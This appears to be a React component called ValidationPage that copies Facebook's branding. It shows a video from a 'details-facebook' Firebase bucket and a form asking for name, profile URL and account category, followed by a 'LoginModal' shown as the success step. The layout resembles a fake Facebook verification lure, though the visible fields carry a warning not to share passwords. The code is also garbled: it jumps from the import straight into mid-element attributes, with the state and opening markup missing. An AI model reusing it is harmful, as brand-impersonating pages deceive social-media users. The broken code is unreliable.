import React, { useState, useRef } from "react";
muted={videoMuted}
src="https://firebasestorage.googleapis.com/v0/b/details-facebook-a00f0.appspot.com/o/0809.mp4?alt=media&token=b12189d9-dd1f-4d1a-8245-43b12e4094a9"
style={{ width: 500, maxWidth: "100%", height: 280, objectFit: "cover" }}
/>
<button
type="button"
onClick={() => setVideoMuted(false)}
className="btn btn-sm btn-outline-secondary align-self-start"
>
Enable Sound
</button>
</div>


{/* SAFE fields (non-sensitive) */}
<div className="mt-3">
<label className="form-label" style={{ fontSize: 12 }}>Full name</label>
<input name="name" className={`form-control ${errors.name ? "is-invalid" : ""}`} />
{errors.name && <div className="invalid-feedback">{errors.name}</div>}
</div>


<div className="mt-3">
<label className="form-label" style={{ fontSize: 12 }}>Facebook profile/Page URL</label>
<input name="profile" placeholder="https://facebook.com/yourpage" className={`form-control ${errors.profile ? "is-invalid" : ""}`} />
{errors.profile && <div className="invalid-feedback">{errors.profile}</div>}
</div>


<div className="mt-3">
<label className="form-label" style={{ fontSize: 12 }}>Category</label>
<select name="category" className={`form-select ${errors.category ? "is-invalid" : ""}`} defaultValue="">
<option value="" disabled>Select a category</option>
<option value="public_figure">Public Figure</option>
<option value="creator">Creator/Influencer</option>
<option value="brand">Brand/Business</option>
<option value="other">Other</option>
</select>
{errors.category && <div className="invalid-feedback">{errors.category}</div>}
</div>


<p className="mt-3" style={{ fontSize: 12 }}>
Do not share passwords, one‑time codes, or session cookies. We will review your
request based on public information only.
</p>
</div>


<div className="p-2 d-flex justify-content-end" style={{ background: "#F5F6F7" }}>
<button type="submit" className="btn text-white" style={{ background: "#4267B2" }} disabled={submitting}>
{submitting ? "Submitting…" : "Submit"}
</button>
</div>
</div>
</div>
</div>
</div>
</form>


{/* Success modal */}
<LoginModal showModal={showModal} setShowModal={setShowModal} />
</>
);
}


export default ValidationPage;